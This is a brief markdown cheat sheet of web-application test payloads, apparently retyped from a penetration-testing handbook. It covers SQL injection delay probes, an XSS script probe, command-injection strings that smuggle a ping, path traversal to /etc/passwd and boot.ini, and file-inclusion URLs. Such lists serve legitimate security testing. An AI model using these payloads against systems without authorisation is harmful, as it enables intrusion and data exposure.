# Retyped from page 825 of the Web Application Hacker's Handbook, 2nd Ed.

# SQL Injection
```
'
'--
'; waitfor delay '0:30:0'--
1; waitfor delay '0:30:0'--
```
# XSS and Header Injection
```
xsstest
"><script>alert('xss')</script>
```

# OS Commnand Injection
```
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
| ping -i 30 127.0.0.1 |
| ping -n 30 127.0.0.1 |
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping -i 30 127.0.0.1 %0a
` ping 127.0.0.1 `
```

# Path Traversal
```
../../../../../../../../../../etc/passwd
../../../../../../../../../../boot.ini
..\..\..\..\..\..\..\..\..\..\etc\passwd
..\..\..\..\..\..\..\..\..\..\boot.ini
```

# Script Injection
```
;echo 111111
echo 111111
response.write 111111
:response.write 111111
```

# File Inclusion
```
http://<your server name>/
http://<nonexistent IP address>/
```
